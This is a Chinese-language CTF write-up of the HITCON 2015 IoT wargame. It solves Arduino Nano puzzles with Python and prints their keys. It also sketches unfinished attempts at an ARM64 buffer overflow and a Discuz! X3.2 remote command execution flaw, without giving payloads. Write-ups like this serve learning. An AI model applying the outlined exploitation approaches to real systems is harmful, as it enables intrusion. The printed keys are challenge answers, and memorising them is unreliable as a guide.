這題會拿到一串&lt;a href="https://zh.wikipedia.org/zh-tw/%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81"&gt;摩斯密碼&lt;/a&gt;&lt;br /&gt;
&lt;code&gt;.... .. - -.-. --- -. -. .- -. --- --. .- -- . -- --- .-. ... .&lt;/code&gt;&lt;br /&gt;
隨便找個解摩斯密碼的網站 &lt;a href="http://morsecode.scphillips.com/translator.html"&gt;http://morsecode.scphillips.com/translator.html&lt;/a&gt;&lt;br /&gt;
解碼後得到 &lt;code&gt;HITCONNANOGAMEMORSE&lt;/code&gt;&lt;br /&gt;
把 &lt;code&gt;game0()&lt;/code&gt; 的 &lt;code&gt;answer = ''&lt;/code&gt; 改成 &lt;code&gt;answer = 'HITCONNANOGAMEMORSE'&lt;/code&gt;&lt;br /&gt;
再執行一次 &lt;code&gt;ans.py&lt;/code&gt; 便可得到 key  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Nano$ key is 457E1A295B9D1C48&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;NANO 2&lt;/h3&gt;
&lt;p&gt;&lt;a href="/files/hitcon-2015-iot-wargame/nano/nano-2.tgz"&gt;NANO 2 原始檔&lt;/a&gt;&lt;br /&gt;
這是三題裡面最難的一題，也是三題中最少人解出來的。&lt;br /&gt;
這題要在九秒內走出 &lt;code&gt;14*14&lt;/code&gt; 的迷宮，&lt;br /&gt;
從 &lt;code&gt;(0, 0)&lt;/code&gt; 走到 &lt;code&gt;(14,14)&lt;/code&gt;&lt;br /&gt;
(除非你手速夠快，不然以本題的設計基本上九秒走不完)  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;#39;O&amp;#39; 代表人、&amp;#39;.&amp;#39; 代表路、&amp;#39;+&amp;#39; 代表牆、&amp;#39;X&amp;#39; 代表出口  
&amp;#39;w&amp;#39; 往上走、&amp;#39;a&amp;#39; 往左走、&amp;#39;s&amp;#39; 往下走、&amp;#39;d&amp;#39; 往右走  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;必須修改 &lt;code&gt;game1()&lt;/code&gt; 裡頭的內容，&lt;br /&gt;
把走迷宮的演算法寫在裏面。  &lt;/p&gt;
&lt;p&gt;我用的方法其實是半自動的，在必要的時候需要手動，也不保證每次成功。&lt;br /&gt;
(要全自動的話可能需要用 &lt;a href="https://en.wikipedia.org/wiki/Breadth-first_search"&gt;BFS&lt;/a&gt;，但我太廢，覺得這樣已經能解出題目就夠了。)  &lt;/p&gt;
&lt;p&gt;程式每次會呈獻 3x3 的現在位置地圖，&lt;br /&gt;
因為 'O' 每次的位置不固定，&lt;br /&gt;
所以先找到 'O' 的現在位置後，&lt;br /&gt;
將其紀錄為 &lt;code&gt;pos_x&lt;/code&gt; 和 &lt;code&gt;pos_y&lt;/code&gt;，&lt;br /&gt;
方便之後判斷其上下左右是否可走。  &lt;/p&gt;
&lt;p&gt;再來因為我們要往右下方行走才能到達出口，&lt;br /&gt;
所以就判斷如果 'O' 的右邊(&lt;code&gt;lines[pos_y, pos_x+1]&lt;/code&gt;) 是 '.'(路) 的話就往右走，&lt;br /&gt;
已右邊舉例的話，如果有下列情況的話，就改換下一個優先的方向檢查： (按照 右、下、左、上 的順序)  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;邊界(&lt;code&gt;pos_x == 2&lt;/code&gt;)  (&lt;code&gt;pos_x+ 1&lt;/code&gt; 就超出邊界了)  &lt;/li&gt;
&lt;li&gt;'O' 的右邊是 '+' (牆)  &lt;/li&gt;
&lt;li&gt;上一步是往左走(往反方向走)  &lt;ul&gt;
&lt;li&gt;避免左右左右、上下上下這種不會前進的狀況發生  &lt;/li&gt;
&lt;li&gt;造成了另一個問題，每當走入三面都是牆的洞的時候，就會卡住。  &lt;/li&gt;
&lt;li&gt;這時就會需要手動移動  &lt;/li&gt;
&lt;li&gt;因為要得知上一步，所以我建立了 &lt;code&gt;steps = [None]&lt;/code&gt; 紀錄每一步的順序  &lt;/li&gt;
&lt;li&gt;把每次的移動利用 &lt;code&gt;steps.append()&lt;/code&gt; 紀錄起來  &lt;/li&gt;
&lt;li&gt;並在每次透過 &lt;code&gt;steps[-1]&lt;/code&gt; 得知上一步  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;依此類推，照著 &lt;code&gt;右、下、左、上、手動&lt;/code&gt; 的先後順序，寫出程式碼。&lt;br /&gt;
開始執行後，遇到卡住的狀況就手動控制，試個幾次很快就可以走出迷宮  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Nano$ key is 3D52CB746F9E6C83&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;NANO 3&lt;/h3&gt;
&lt;p&gt;&lt;a href="/files/hitcon-2015-iot-wargame/nano/nano-3.tgz"&gt;NANO 3 原始檔&lt;/a&gt;&lt;br /&gt;
這題是必須在一秒內回答四則運算的結果，&lt;br /&gt;
看一下題目，可以發現題目的字串長的像這樣&lt;br /&gt;
&lt;code&gt;Nano$ 7 * 10 - 14 + 6 - 5 - 19 = ?&lt;/code&gt;&lt;br /&gt;
所以可以透過 Regular Expression&lt;br /&gt;
&lt;a href="https://docs.python.org/2/library/re.html"&gt;7.2. re — Regular expression operations — Python 2.7.10 documentation&lt;/a&gt;&lt;br /&gt;
把 &lt;code&gt;7 * 10 - 14 + 6 - 5 - 19&lt;/code&gt; 取出來後&lt;br /&gt;
丟給 &lt;a href="https://docs.python.org/2/library/functions.html#eval"&gt;eval()&lt;/a&gt; 算出結果，&lt;br /&gt;
再把值 assign 給 answer 回答。&lt;br /&gt;
(&lt;code&gt;eval()&lt;/code&gt; 可以把字串當作 expression 進行求值，雖然很方便，但真正在開發程式的時候最好不要亂用，尤其是不要把使用者輸入的資料丟給 &lt;code&gt;eval()&lt;/code&gt;，因為你永遠不知道使用者會輸入什麼奇怪的東西)&lt;br /&gt;
照著這個想法修改一下 &lt;code&gt;game2()&lt;/code&gt;，這題應該就解決了  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Nano$ key is 273A9C1E2D380B48&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;極度建議自己寫程式碼，&lt;br /&gt;
真的真的想不出來的話再點下面的連結吧！&lt;br /&gt;
不然是不會進步的。&lt;br /&gt;
程式碼請見：&lt;a href="https://gist.github.com/M157q/164f9ba5bd8ae0b18afe"&gt;https://gist.github.com/M157q/164f9ba5bd8ae0b18afe&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;然後看到 IRC 有人提到，&lt;br /&gt;
他把 Nano 上的 binary dump 到電腦上，&lt;br /&gt;
直接用 &lt;code&gt;strings&lt;/code&gt; 拿到 3 個 key，&lt;br /&gt;
不知道怎麼做到的&lt;br /&gt;
查了一些關鍵字，會是&lt;code&gt;avr-objdump&lt;/code&gt;嗎?  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;補上直接 dump 的 write-up &lt;a href="http://kb.hitcon.org/post/128246307977/%E7%A7%92%E8%A7%A3-hitcon-nano-%E9%A1%8C"&gt;HITCON Knowledge Base — 秒解 Hitcon Nano 題&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Raspberry Pi 部份&lt;/h2&gt;
&lt;p&gt;有分四題：R0, R1, R2, R4 的題目都不同，都是由 Orange 出題。&lt;br /&gt;
我只有碰 R0 跟 R1 的題目，有些想法，但都沒解出來，以下簡單紀錄。  &lt;/p&gt;
&lt;h3&gt;R0&lt;/h3&gt;
&lt;p&gt;Web 那邊會拿到一個 &lt;a href="/files/hitcon-2015-iot-wargame/rpi/r0/forkyou"&gt;ARM64 的 binary 執行檔&lt;/a&gt;，&lt;br /&gt;
之後用 &lt;code&gt;qemu-aarch64&lt;/code&gt; 的環境就可以執行，&lt;br /&gt;
聽說還蠻簡單的，可是我還是解不出來QQ&lt;br /&gt;
似乎有在某處看到 &lt;code&gt;/bin/sh -c&lt;/code&gt; 之類的呼叫，&lt;br /&gt;
應該是利用 BOF 把 EIP 指到那邊就可以拿到 shell 了?  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;補上 R0 write-up &lt;a href="http://kb.hitcon.org/post/127947378507/hitcon-2015-iot-wargame-r0-%E6%8C%91%E6%88%B0%E9%A1%8C"&gt;HITCON Knowledge Base — HITCON 2015 IoT Wargame – R0 挑戰題&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;R1&lt;/h3&gt;
&lt;p&gt;連進去是 Discuz! X3.2&lt;br /&gt;
查了一下，有 remote shell execute 漏洞:&lt;br /&gt;
&lt;a href="http://drops.wooyun.org/papers/4611"&gt;DiscuzX系列命令执行分析公开（三连弹） | WooYun知识库&lt;/a&gt;&lt;br /&gt;
照著做之後，&lt;br /&gt;
找不到在 &lt;code&gt;data/attachment&lt;/code&gt; 底下符合權限的圖片來編輯，&lt;br /&gt;
(最近重灌，還沒裝 DirBuster 或是 Burp Suite，所以沒暴力掃底下有哪些東西...)&lt;br /&gt;
無法觸發 picwidth 的 Remote Shell Excution 漏洞，&lt;br /&gt;
感覺方向應該是對的吧？&lt;br /&gt;
這題是四題裏面沒被人解出來的。&lt;br /&gt;
(GeoHot 把其他三題都解掉了...)  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;這次的 Wargame 大概就是這樣吧，&lt;br /&gt;
果然實力還是不夠，&lt;br /&gt;
HST 的 Wargame 拿到 reversed.txt 裡頭一串 ...---.. 後也沒啥想法。  &lt;/p&gt;
&lt;p&gt;會把 Nano 的部份寫的這麼詳細的原因，&lt;br /&gt;
是因為想要推廣大家玩一下 Wargame 吧！&lt;br /&gt;
(覺得有趣的話就可以來打 CTF 了)&lt;br /&gt;
畢竟上面也講了，這次 Wargame 真的不算難，&lt;br /&gt;
而將近 1000 人的會眾，只有不到 300 人註冊，只有 161 人有拿到分，&lt;br /&gt;
這比例實在有點少。&lt;br /&gt;
再加上幾天前在 Facebook 上看到有人說 Nano 一片一片燒，燒到手快斷了，&lt;br /&gt;
覺得這麼少人玩實在有點可惜。  &lt;/p&gt;
&lt;p&gt;處理好 Arduino Nano 跟電腦連接之後，&lt;br /&gt;
基本上就是寫 Python Code，&lt;br /&gt;
所以我才戲稱是 Python Wargame，&lt;br /&gt;
但其實沒學過 Python 的人藉著這個機會學一下 Python 也不錯，&lt;br /&gt;
畢竟因為 Python 的方便性，很多 exploit 都用 Python 寫了。  &lt;/p&gt;
&lt;p&gt;總之，這篇就是一個小廢物的流水帳。&lt;br /&gt;
有問題歡迎留言討論，但我不一定會就是T_T。  &lt;/p&gt;</summary><category term="CTF"></category><category term="HITCON"></category><category term="Arduino"></category><category term="Python"></category><category term="Raspberry Pi"></category><category term="Write-up"></category><category term="Conf"></category></entry></feed>